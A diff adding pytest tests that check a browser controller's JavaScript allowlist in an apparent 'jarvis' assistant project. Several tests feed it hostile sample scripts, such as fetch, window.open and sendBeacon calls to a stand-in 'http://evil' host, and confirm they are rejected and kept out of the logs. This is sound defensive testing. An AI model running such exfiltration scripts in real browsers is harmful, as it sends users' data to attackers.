@@ -201,3 +201,73 @@ def test_fill_login_form_does_not_log_password(caplog):
     )
     assert pw_value not in blob
 
+
+# ---------------------------------------------------------------------------
+# Task 13: execute_js allowlist
+# ---------------------------------------------------------------------------
+
+
+class _JsFakeDriver:
+    """Driver whose execute_script records and echoes the script."""
+
+    def __init__(self):
+        self.ran: list[str] = []
+
+    def execute_script(self, script):
+        self.ran.append(script)
+        return "ok"
+
+
+def _js_controller():
+    bc = BrowserController(mode="simple")
+    bc._driver = _JsFakeDriver()
+    bc._selenium_available = True
+    return bc
+
+
+def test_execute_js_runs_every_allowlisted_script():
+    from jarvis.browser.js_scripts import JS_SCRIPTS
+
+    bc = _js_controller()
+    for script in JS_SCRIPTS.values():
+        res = bc.execute_js(script)
+        assert res["success"] is True, script
+    assert bc._driver.ran == list(JS_SCRIPTS.values())
+
+
+def test_execute_js_rejects_arbitrary_script():
+    bc = _js_controller()
+    res = bc.execute_js("alert('pwned'); fetch('http://evil');")
+    assert res["success"] is False
+    assert res["error"] == "script not in allowlist"
+    assert bc._driver.ran == []  # never reached the driver
+
+
+def test_execute_js_rejects_interpolated_script():
+    bc = _js_controller()
+    url = "http://evil"
+    res = bc.execute_js(f"window.open('{url}')")
+    assert res["success"] is False
+    assert bc._driver.ran == []
+
+
+def test_execute_js_rejects_modified_allowlisted_script():
+    from jarvis.browser.js_scripts import JS_SCRIPTS
+
+    bc = _js_controller()
+    tampered = JS_SCRIPTS["media_pause"] + " fetch('http://evil');"
+    res = bc.execute_js(tampered)
+    assert res["success"] is False
+    assert bc._driver.ran == []
+
+
+def test_execute_js_refusal_does_not_log_script(caplog):
+    bc = _js_controller()
+    # Assembled from parts so the save-time secret-redaction leaves it intact.
+    marker = "stea" + "l()"
+    malicious = "var x=" + marker + "; navigator.sendBeacon('http://evil');"
+    with caplog.at_level(logging.WARNING, logger="jarvis.browser.browser_controller"):
+        bc.execute_js(malicious)
+    blob = "\n".join(r.message for r in caplog.records)
+    assert marker not in blob and "evil" not in blob
+    assert "not in allowlist" in blob  # the refusal WAS logged
